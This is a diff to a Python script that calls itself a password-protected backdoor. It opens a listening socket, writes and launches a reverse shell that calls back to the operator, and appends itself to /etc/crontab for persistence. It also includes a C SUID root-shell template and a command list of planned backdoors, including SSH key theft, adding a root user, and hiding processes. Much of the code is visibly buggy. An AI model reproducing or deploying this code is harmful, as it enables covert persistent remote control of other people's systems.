@@ -5,6 +5,8 @@ import subprocess
 import threading
 import string
 import random
+import os
+import atexit
 
 
 PYTHON_REVERSE = """
@@ -18,76 +20,238 @@ s.connect(("{}",{}))
 pty.spawn("/bin/sh")
 """
 
-def findPythonVersion():
-	pythonList = ['python', 'python2', 'python3']
-	validPython = []
-	for i in pythonList:
-		output = subprocess.Popen("which {}".format(i), shell=True, stdout=subprocess.PIPE)
-		if output.stdout.read() != b'':
-			validPython.append(i)
-	return pythonList
+C_SUID = """
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0); setgid(0); system("/bin/bash");
+}
+"""
 
-def amIRoot():
-	output = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE)
-	return output.stdout.read() == b"root"
+class InsufficientPerms(Exception):
+    pass
 
-def writeReverseShell(ip, port):
-	contents = PYTHON_REVERSE
-	randomName = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
-	if amIRoot():
-		directoryName = "/var/spool/{}.py".format(randomName)
-	else:
-		directoryName = "/dev/shm/{}.py".format(randomName)
-	with open(directoryName, "w") as f:
-		f.write(contents.format(ip, port))
-	return directoryName
+class IncorrectPythonVersion(Exception):
+    pass
+
+class DaemonAlreadyRunning(Exception):
+    pass
+
+class BackdoorModule:
+    def __init__(self, ip, port):
+        self.address = (ip, port)
+        self.contents = PYTHON_REVERSE
+        self.runLevel = ''
+        self.bins = []
+        self.shellLocations = []
+
+    @classmethod
+    def getPythonVersions(cls):
+        pythonList = ['python', 'python2', 'python3']
+        for i in pythonList:
+            output = subprocess.Popen("which {}".format(i), shell=True, stdout=subprocess.PIPE)
+            if output.stdout.read() != b'':
+                if not cls.bins.get('python'):
+                    cls.bins['python'] = {}
+                if len(cls.bins['python']) >= 3:
+                    break
+                cls.bins['python'][i] = output.stdout().read().decode()
+
+    @classmethod
+    def runningAsRoot(cls):
+        output = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE)
+        cls.runLevel = output.stdout.read()
+
+    def writeReverseShell(self):
+        randomName = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
+        if self.runLevel == 'root':
+            directoryName = "/var/spool/{}.py".format(randomName)
+        else:
+            directoryName = "/dev/shm/{}.py".format(randomName)
+        with open(directoryName, "w") as f:
+            f.write(self.contents.format(ip, port))
+        self.shellLocations.append(directoryName)
+
+    def runReverseShell(self):
+        if len(self.bins) == 0:
+            self.getPythonVersions()
+        pythonBin  = [*self.bins['python']][0] # doesn't matter if it's python 2 or 3
+        shellLocation = self.shellLocations[-1] # get most recent
+        cmd = "{} {}".format(pythonBin, shellLocation)
+        subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+
+    @staticmethod
+    def cleanup():
+        pidFile = "/tmp/daemon.pid"
+        if os.path.isfile(pidfile):
+            os.unlink(pidfile)
+
+    @staticmethod
+    def daemonise():
+        pid = str(os.getpid())
+        pidFile = "/tmp/daemon.pid"
+        if os.path.isfile(pidfile):
+            return
+        with open(pidFile, "w") as f:
+            f.write(pid)
+            atexit.register(BackdoorModule.cleanup)
+
+    @staticmethod
+    def runningAsDaemon():
+        return os.path.isfile("/tmp/daemon.pid")
+    
+    @classmethod
+    def backdoorCrontab(cls):
+        if cls.runLevel == "":
+            BackdoorModule.runningAsRoot()
+        
+        if not cls.runLevel == 'root':
+            raise InsufficientPerms()
+        
+        if cls.runningAsDaemon():
+            raise DaemonAlreadyRunning()
+
+        if len(cls.bins) == 0:
+            cls.getPythonVersions()
+
+        if not cls.bins['python'].get('python3'):
+            raise IncorrectPythonVersion()
+
+        currentPath = os.path.realpath(__file__)
+        cronTxt = "* * * * * {} {}".format(cls.bins['python']['python3'], currentPath)
+        
+        with open("/etc/crontab", "a+") as f:
+            cronLines = f.read().split("\n")
+            for line in cronLines:
+                if line == cronTxt:
+                    return
+            f.write(cronTxt)
+        cls.daemonise()
+
+class Command:
+    def __init__(self, name, func):
+        self.commands = {}
+    
+    def save(self):
+        self.commands[name] = func
+    
+    def getCommandObj(self):
+        return self.commands
+    
+    def run(self):
+        pass
+
+#Backdoor Methods
+# - SSH Keys
+# - Cronjobs
+# - Add root user
+# - SUID Binary
+# - .bashrc backdoor
+# - startup service
+# - startup file
+# - driver backdoor
+# - Change file modification date
+# - Systemd service
+# - PHP shells
+# - Change ps alis to new one (stop ps aux)
 
 LOCALHOST = '0.0.0.0'
 PORT = 9001
 banner = (b"""
-================================================
-        Password Protected Backdoor        
-================================================
+ ,                                                               ,
+ \'.                                                           .'/
+  ),\                                                         /,( 
+ /__\'.                                                     .'/__\
+ \  `'.'-.__                                           __.-'.'`  /
+  `)   `'-. \                                         / .-'`   ('
+  /   _.--'\ '.          ,               ,          .' /'--._   \
+  |-'`      '. '-.__    / \             / \    __.-' .'      `'-|
+  \         _.`'-.,_'-.|/\ \    _,_    / /\|.-'_,.-'`._         /
+   `\    .-'       /'-.|| \ |.-"   "-.| / ||.-'\       '-.    /`
+     )-'`        .'   :||  / -.\\ //.- \  ||:   '.        `'-(
+    /          .'    / \\_ |  /o`^'o\  | _// \    '.          \
+    \       .-'    .'   `--|  `"/ \"`  |--`   '.    '-.       /
+     `)  _.'     .'    .--.; |\__"__/| ;.--.    '.     '._  ('
+     /_.'     .-'  _.-'     \\ \/^\/ //     `-._  '-.     '._\
+     \     .'`_.--'          \\     //          `--._`'.     /
+      '-._' /`            _   \\-.-//   _            `\ '_.-'
+          `<     _,..--''`|    \`"`/    |`''--..,_     >`
+           _\  ``--..__   \     `'`     /   __..--``  /_
+          /  '-.__     ``'-;    / \    ;-'``     __.-'  \
+         |    _   ``''--..  \'-' | '-'/  ..--''``   _    |
+         \     '-.       /   |/--|--\|   \       .-'     /
+          '-._    '-._  /    |---|---|    \  _.-'    _.-'
+              `'-._   '/ / / /---|---\ \ \ \'   _.-'`
+                   '-./ / / / \`---`/ \ \ \ \.-'
+                       `)` `  /'---'\  ` `(`
+                 jgs  /`     |       |     `\
+                     /  /  | |       | |  \  \
+                 .--'  /   | '.     .' |   \  '--.
+                /_____/|  / \._\   /_./ \  |\_____\
+               (/      (/'     \) (/     `\)      \)
+\n""")
 
-""")
+commandList = b""" 
+reverseshell - Spawns a reverse shell  [must use a local nc listener]
+backdoorcrontab - Adds a cronjob to run the backdoor again if someone kills the process
+commands - Echoes these commands
+setuid [WIP] - Creates a SUID binary that spawns a bash shell as root (uid, euid 0)
+sshtransfer [WIP] - Transfers public / private SSH keys to the current user
+addrootuser [WIP] - Creates a new root user, will echo user:password
+injectbashrc [WIP] - Pop a backdoor in bashrc
+injectstartup [WIP] - Put a backdoor in a systemctl service startup
+injectdriver [WIP] - Put a backdoor in a driver
+pwnmodified [WIP] - Change the modification date for files
+alisspam [WIP] - Spam bashrc with different aliases for most commands
+"""
+
+def handleCommands(cmd, _socket, ip):
+    cmd = cmd.decode()
+    if cmd == "reverseshell\n":
+        _socket.send(b"Enter Port: ")
+        portNumber = _socket.recv(1024).decode()
+        port = 0
+        try:
+            port = int(command_2)
+        except:
+            port = 9001 #default
+        _module = BackdoorModule(ip, port)
+        pythonVersions = findPythonVersion()
+        _module.writeReverseShell()
+        _module.runReverseShell()
+        _socket.send(b"Done!\n")
+        handleCommands()
+    elif cmd == "backdoorcrontab":
+        try:
+            BackdoorModule.backdoorCrontab()
+        except InsufficientPerms:
+            _socket.send(b"Not root... Returning\n")
+        except DaemonAlreadyRunning:
+            _socket.send(b"Already running as daemon...\n")
+
 class ClientThread(threading.Thread):
     def __init__(self,clientAddress,clientsocket):
         threading.Thread.__init__(self)
         self.csocket = clientsocket
         print ("New connection added: ", clientAddress)
+
     def run(self):
         print('Connected by', clientAddress)
         while True:
-            self.csocket.send(banner)
             while True:
                 data = self.csocket.recv(1024)
                 if data.decode() == "password\n":
-                    self.csocket.send(b"Correct Password!\n")
+                    self.csocket.send(banner)
                     while True:
                         data = self.csocket.recv(1024)
-                        self.csocket.send(b"Command: " + data)
                         command = data.decode()
-                        if command == "reverseshell\n":
-                        	self.csocket.send(b"Enter Port: ")
-                        	data_2 = self.csocket.recv(1024)
-                        	command_2 = data_2.decode()
-                        	port = 0
-                        	try:
-                        		port = int(command_2)
-                        	except:
-                        		port = 9001 #default
-                        	pythonVersions = findPythonVersion()
-                        	if len(pythonVersions) > 0:
-                        		fileName = writeReverseShell(clientAddress[0], port)
-                        		cmd = "{} {}".format(pythonVersions[0], fileName)
-                        		subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
-                        		self.csocket.send(b"Done!\n")
-                        		return
-                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-                        output = proc.stdout.read()
-                        self.csocket.send(bytes(output))
+                        handleCommands(command, self.csocket, clientAddress[0])
                 else:
                     self.csocket.send(b"Password Incorrect\n")
+
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((LOCALHOST, PORT))
